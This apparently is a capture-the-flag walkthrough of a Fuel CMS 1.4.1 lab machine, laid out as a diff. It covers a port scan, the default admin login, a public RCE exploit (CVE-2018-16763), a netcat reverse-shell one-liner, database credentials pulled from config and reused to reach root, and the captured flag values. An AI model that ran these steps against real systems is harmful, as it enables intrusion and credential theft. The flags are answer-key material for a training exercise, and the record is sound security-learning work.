@@ -1,0 +1,151 @@
+Main IP :: 10.48.130.69
+
+
+So we start with all port nmap scan.
+
+ nmap 10.48.130.69 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 05:40 UTC
+Nmap scan report for ip-10-48-130-69.ap-south-1.compute.internal (10.48.130.69)
+Host is up (0.00014s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for 10.48.130.69
+Host is up, received echo-reply ttl 62 (0.059s latency).
+Scanned at 2026-05-16 18:26:30 +1245 for 9s
+
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Welcome to FUEL CMS
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+
+So we got this and their is Fuel CMS thing when we visit the web-page.
+
+Moving to robots.txt 
+
+That's it!
+To access the FUEL admin, go to:
+http://10.48.130.69/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+Reading page we see and when we try that out we are into the dashboard.
+
+searchsploit -m 50477                                 
+  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
+      URL: https://www.exploit-db.com/exploits/50477
+     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
+    Codes: CVE-2018-16763
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/thm/ignite/50477.py
+
+
+performing searches tells that this Fuel CMS version is vulnerable to RCE.
+
+ython 50477.py -u http://10.48.130.69/    
+[+]Connecting...
+Enter Command $ls
+systemREADME.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+
+
+Enter Command $pwd
+system/var/www/html
+
+
+And we are into the terminal reading user.txt first.
+
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.49 4444 >/tmp/f"
+
+wget https://raw.githubusercontent.com/ice-wzl/Fuel-1.4.1-RCE-Updated/main/Fuel-Updated.py
+--2026-05-16 18:52:16--  https://raw.githubusercontent.com/ice-wzl/Fuel-1.4.1-RCE-Updated/main/Fuel-Updated.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1027 (1.0K) [text/plain]
+Saving to: ‘Fuel-Updated.py’
+
+Fuel-Updated.py       100%[=======================>]   1.00K  --.-KB/s    in 0s      
+
+2026-05-16 18:52:17 (50.7 MB/s) - ‘Fuel-Updated.py’ saved [1027/1027]
+
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/ignite]
+└─# python3 Fuel-Updated.py http://10.48.130.69 192.168.145.49 4444   
+Use this script above is useless.
+
+g on 0.0.0.0 4444
+Connection received on 10.48.130.69 55084
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/ignite]
+└─# stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+
+www-data@ubuntu:/var/www/html$ export TERM=xterm-256color
+o match your terminal sizetml$ stty rows 24 columns 80   # adjust rows/columns t 
+www-data@ubuntu:/var/www/html$ 
+
+
+Shell is stabilized.
+
+Moving around and looking much.
+
+      'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+);
+
+// used for testing purposes
+if (defined('TESTING'))
+{
+        @include(TESTER_PATH.'config/tester_database'.EXT);
+}
+www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php 
+
+
+ su root
+Password: 
+su: Authentication failure
+www-data@ubuntu:/var/www/html/fuel/application/config$ su root
+
+with this  we are root now reading both flags.
+
+
+root@ubuntu:/home/www-data# cat flag.txt 
+6470e394cbf6dab6a91682cc8585059b 
+root@ubuntu:/home/www-data# cat /root/
+.bash_history  .cache/        .profile       
+.bashrc        .nano/         root.txt       
+root@ubuntu:/home/www-data# cat /root/root.txt 
+b9bbcb33e11b80be759c4e844862482d 
+root@ubuntu:/home/www-data# 
+
